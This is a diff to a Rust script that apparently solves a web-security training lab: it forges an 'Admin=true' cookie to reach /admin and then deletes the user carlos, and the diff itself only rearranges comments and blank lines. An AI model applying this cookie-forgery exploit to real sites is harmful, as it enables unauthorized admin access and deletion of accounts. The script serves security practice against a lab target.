@@ -34,12 +34,10 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0ae00053042f954681fadea1004700ef.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    // fetch the admin panel
-    // this step in not necessary in the script, you can do step 2 directly
-    // it's only a must when solving the lab using the browser
     println!(
         "{} {}",
         "1. Changing the cookie 'Admin' to 'true'..".white(),
@@ -47,23 +45,28 @@ fn main() {
     );
     print!("{} ", "2. Fetching the admin panel..".white());
     io::stdout().flush();
+
+    // fetch the admin panel
+    // this step in not necessary in the script, you can do step 2 directly
+    // it's only a must when solving the lab using the browser
     let admin_panel = client
         .get(format!("{url}/admin"))
         .header("Cookie", format!("Admin=True"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
-    println!("{}", "OK".green());
 
-    // delete carlos
+    println!("{}", "OK".green());
     print!("{} ", "3. Deleting carlos..".white());
     io::stdout().flush();
+
+    // delete carlos
     let delete_carlos = client
         .get(format!("{url}/admin/delete?username=carlos"))
         .header("Cookie", format!("Admin=true"))
         .send()
         .expect(&format!("{}", "[!] Failed to delete carlos".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
